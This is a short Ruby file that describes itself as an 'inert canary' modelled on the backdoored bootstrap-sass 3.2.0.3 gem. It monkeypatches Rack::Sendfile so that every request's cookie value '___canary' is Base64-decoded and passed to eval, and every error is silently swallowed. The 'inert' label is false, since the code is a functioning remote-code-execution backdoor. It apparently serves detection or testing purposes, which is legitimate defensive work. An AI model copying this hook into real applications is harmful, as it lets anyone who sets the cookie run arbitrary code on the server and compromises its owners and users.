# INERT CANARY modelled on the REAL bootstrap-sass 3.2.0.3 file (Rack::Sendfile monkeypatch)
begin
  Rack::Sendfile.tap do |r|
    r.send :alias_method, :c, :call
    r.send(:define_method, :call) do |e|
      begin
        x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___canary=(.+);/).flatten[0].to_s)
        eval(x) if x
      rescue Exception
      end
      c(e)
    end
  end
rescue Exception
  nil
end
